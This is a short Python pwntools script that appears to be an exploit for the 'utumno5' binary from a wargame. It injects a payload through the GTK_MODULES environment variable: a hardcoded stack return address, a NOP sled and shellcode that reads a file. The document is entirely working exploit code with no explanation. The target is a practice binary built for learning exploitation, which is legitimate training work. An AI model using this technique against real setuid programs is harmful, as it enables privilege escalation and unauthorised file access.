#!/usr/bin/python3

from pwn import *
import os

filepath = "./exploit.py"

elf = context.binary = ELF('./utumno5')

payload = b''
payload += b'MACA'
payload += p32(0xffffd278 + 80)
payload += b'\x90' * 160
payload += asm(shellcraft.cat(filepath))


os.environ["GTK_MODULES"] = payload.decode('latin-1')

p = process(argv=[], executable="./utumno5")

log.info(p.recv(timeout=1))
# p.interactive()

with open("payload.b", "wb") as file:
    file.write(payload)

